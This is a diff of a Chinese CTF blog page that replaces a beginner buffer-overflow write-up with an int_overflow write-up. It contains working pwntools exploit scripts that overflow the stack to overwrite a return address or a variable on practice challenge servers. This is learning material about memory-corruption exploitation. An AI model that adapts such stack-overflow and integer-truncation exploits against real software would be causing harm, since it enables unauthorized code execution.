@@ -24,30 +24,35 @@
     var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
-  <meta name="description" content="我的第一道pwn题（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ） （而且还是对着writeup做的QAQ）">
+  <meta name="description" content="pwn整数溢出攻防世界int_overflow">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第一道pwn题">
-<meta property="og:url" content="https://mark0519.github.io/2020/11/18/my-first-pwn/index.html">
+<meta property="og:title" content="pwn整数溢出">
+<meta property="og:url" content="https://mark0519.github.io/2021/01/09/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/index.html">
 <meta property="og:site_name" content="mark0519的博客">
-<meta property="og:description" content="我的第一道pwn题（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ） （而且还是对着writeup做的QAQ）">
+<meta property="og:description" content="pwn整数溢出攻防世界int_overflow">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8a1cb1fa1a28c6c5dd193259f683e769c97516e7.png">
-<meta property="og:image" content="https://s3.ax1x.com/2020/11/18/Dn29nP.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/f70c3615aba90b4884ace2cd6cd0079d29c33303.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bbfc53a150c24563a41bcd6305e2bd93c3263541.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4aa515d74692eadb5d124b8c2223f0e9a675178a.png">
-<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a795084c872b178bdc9f1a8af75fcb8b1f5f49b1.png">
-<meta property="article:published_time" content="2020-11-18T14:12:37.000Z">
-<meta property="article:modified_time" content="2020-11-18T15:36:45.993Z">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/500e04fb9ea10fe74c6c5b0bdfd1ad52dacb399c.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d6b5560104d1c0681659e20aa6663c3ebf0e49d3.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/76a6cb4493cfe0c4ef4e0b5c2055a8f88cdcfc4f.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f3ccf452e0bcf3dc5d697038616801e74ef585f.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/495a914ed8834f34a49e0bcf7ffc02badbe090b9.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ba79c6f648519d0357a7bea5f500784f0cd29a40.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f5b23c5c9b377972d3f22ce424d44b363d0d555.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a6e5da8d24384845f823330bb49e0cd91e12a0da.png">
+<meta property="article:published_time" content="2021-01-09T07:17:19.000Z">
+<meta property="article:modified_time" content="2021-01-09T07:57:08.896Z">
 <meta property="article:author" content="mark0519">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="python2">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8a1cb1fa1a28c6c5dd193259f683e769c97516e7.png">
+<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png">
 
 
-<link rel="canonical" href="https://mark0519.github.io/2020/11/18/my-first-pwn/">
+<link rel="canonical" href="https://mark0519.github.io/2021/01/09/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
 
 
 <script class="page-configurations">
@@ -60,7 +65,7 @@
   };
 </script>
 
-  <title>第一道pwn题 | mark0519的博客</title>
+  <title>pwn整数溢出 | mark0519的博客</title>
   
 
 
@@ -188,7 +193,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E9%81%93pwn%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">我的第一道pwn题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%A3%E6%B8%A3%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84wp"><span class="nav-number">1.2.</span> <span class="nav-text">渣渣自己写的wp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Epayload"><span class="nav-number">1.3.</span> <span class="nav-text">关于payload</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">pwn整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -257,7 +262,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2020/11/18/my-first-pwn/">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/01/09/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -270,7 +275,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          第一道pwn题
+          pwn整数溢出
         </h1>
 
         <div class="post-meta-container">
@@ -282,7 +287,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2020-11-18 22:12:37 / 修改时间：23:36:45" itemprop="dateCreated datePublished" datetime="2020-11-18T22:12:37+08:00">2020-11-18</time>
+      <time title="创建时间：2021-01-09 15:17:19 / 修改时间：15:57:08" itemprop="dateCreated datePublished" datetime="2021-01-09T15:17:19+08:00">2021-01-09</time>
     </span>
 
   
@@ -295,39 +300,45 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="我的第一道pwn题"><a href="#我的第一道pwn题" class="headerlink" title="我的第一道pwn题"></a>我的第一道pwn题</h1><p>（其实就是一道pwn的最最最最基础的题目，只是这是渣渣第一次做掉pwn，我觉得有必要纪念一下QAQ）</p>
-<p>（而且还是对着writeup做的QAQ）</p>
+        <h1 id="pwn整数溢出"><a href="#pwn整数溢出" class="headerlink" title="pwn整数溢出"></a>pwn整数溢出</h1><p>攻防世界int_overflow</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png"></p>
 <a id="more"></a>
 
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/8a1cb1fa1a28c6c5dd193259f683e769c97516e7.png"></p>
-<p>攻防世界原链接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5052&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5052&amp;page=1</a></p>
-<h2 id="渣渣自己写的wp"><a href="#渣渣自己写的wp" class="headerlink" title="渣渣自己写的wp"></a>渣渣自己写的wp</h2><p>先用file命令查看查看附件的位数（64or32）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file asd    <span class="comment">//ELF附件的名字叫asd</span></span><br></pre></td></tr></table></figure>
+<p>连接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1</a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>附件checkesc分析</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/500e04fb9ea10fe74c6c5b0bdfd1ad52dacb399c.png"></p>
+<p>没有开启canary保护，可以使用栈溢出的漏洞</p>
+<p>接着使用IDApro分析</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d6b5560104d1c0681659e20aa6663c3ebf0e49d3.png"></p>
+<p>main函数中没有什么问题</p>
+<p>接着检查login（）函数</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/76a6cb4493cfe0c4ef4e0b5c2055a8f88cdcfc4f.png"></p>
+<p>检查check_passwd()函数：</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f3ccf452e0bcf3dc5d697038616801e74ef585f.png"></p>
+<p>注意变量v3，这里就会存在整数溢出漏洞</p>
+<p>对输入的数字s的长度限制在4-8位之间，但是v3为unsigned int8型变量，即为无符号的8bits大小整数</p>
+<p>最大值应该为255：</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/495a914ed8834f34a49e0bcf7ffc02badbe090b9.png"></p>
+<p>如果超出255，就会溢出，即对于unsigned int8型的变量v1和v2，如果v1=0,v2=256；则v1==v2;</p>
+<p>举例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> var1 = <span class="number">1</span>, var2 = <span class="number">65537</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">if</span> (var1 == var2)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;溢出&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s3.ax1x.com/2020/11/18/Dn29nP.png"></p>
-<p>可以看到是64位程序，使用64位的IDA打开</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/f70c3615aba90b4884ace2cd6cd0079d29c33303.png"></p>
-<p>这里可以看到程序里有一个read函数，一个if判断，且当if为真时调用sub_400686函数</p>
-<p>进入sub_400686函数查看具体内容：</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bbfc53a150c24563a41bcd6305e2bd93c3263541.png"></p>
-<p>即调用 cat flag.txt</p>
-<p>故为了获得flag，我们需要时main函数中的if条件为真，即</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_60106C == <span class="number">1853186401</span></span><br></pre></td></tr></table></figure>
+<p>输出结果</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png"></p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png"></p>
+<p>故此题的输入密码的长度应为 4 ~ 8 或 255+4 ~ 255+8</p>
+<p>找到漏洞后，按shift+f12查找关键字</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ba79c6f648519d0357a7bea5f500784f0cd29a40.png"></p>
+<p>即发现cat flag关键字</p>
+<p>即发现函数</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f5b23c5c9b377972d3f22ce424d44b363d0d555.png"></p>
+<p>查看地址</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a6e5da8d24384845f823330bb49e0cd91e12a0da.png"></p>
+<p>得到函数的starts地址，即可在输入passwd时构造字符将chack_passwd的函数返回地址改为what_is_this()函数的地址</p>
+<p>且由于dest变量到栈底的偏移量为0x14，故即可构造exp</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">36374</span>)</span><br><span class="line"></span><br><span class="line">flag_adress=<span class="number">0x804868B</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(flag_adress)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">256</span><span class="number">-0x14</span><span class="number">-4</span><span class="number">-4</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">c.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c.sendlineafter(<span class="string">&quot;Please input your username:\n&quot;</span>,<span class="string">&quot;sjj&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">&quot;Please input your passwd:\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recv()</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line">c.recv()</span><br></pre></td></tr></table></figure>
 
-<p>而read函数会把输入的值赋值给unk，而我们需要改变dword的值，故需要利用栈溢出原理</p>
-<p>这里查看unk和dword的具体地址</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/4aa515d74692eadb5d124b8c2223f0e9a675178a.png"></p>
-<p>即发现unk到dword之间偏移量为4，构造exp：</p>
-<p>（随后具体介绍exp是个啥）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                    //调用pwntools</span><br><span class="line">r=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">40702</span>)     //连接题目服务器，remote(<span class="string">&#x27;ip地址&#x27;</span>，端口)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)     //构造输入的值，具体下文介绍       </span><br><span class="line">r.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)  //recvuntil(<span class="built_in">str</span>)：接收到第一次出现<span class="built_in">str</span>的内容为止</span><br><span class="line">r.sendline(payload)                  //发送之前构造的payload    </span><br><span class="line"><span class="built_in">print</span> r.recv()                       //recv()：接受收到的所有字符</span><br><span class="line"><span class="built_in">print</span> r.recv()</span><br></pre></td></tr></table></figure>
-
-<p>运行exp</p>
-<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a795084c872b178bdc9f1a8af75fcb8b1f5f49b1.png"></p>
-<p>得到flag！！</p>
-<h2 id="关于payload"><a href="#关于payload" class="headerlink" title="关于payload"></a>关于payload</h2><p>上文的payload具体为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br></pre></td></tr></table></figure>
-
-<p>由于unk和dword之间的<strong>偏移量为4</strong>，故填充4个‘a’，然后在填充数字1853186401，由于程序是64位的，故将数字进行p64()打包</p>
+<p>即可得到flag</p>
 
     </div>
 
@@ -345,7 +356,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://mark0519.github.io/2020/11/18/my-first-pwn/" title="第一道pwn题">https://mark0519.github.io/2020/11/18/my-first-pwn/</a>
+      <a href="https://mark0519.github.io/2021/01/09/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="pwn整数溢出">https://mark0519.github.io/2021/01/09/pwn整数溢出/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -363,14 +374,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/11/12/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" rel="prev" title="C语言文件读写">
-                  <i class="fa fa-chevron-left"></i> C语言文件读写
+                <a href="/2020/12/17/leetcode-136-%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/" rel="prev" title="leetcode.136.只出现一次的数字">
+                  <i class="fa fa-chevron-left"></i> leetcode.136.只出现一次的数字
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/11/18/pwn-learn-exp/" rel="next" title="pwn学习-exp">
-                  pwn学习-exp <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
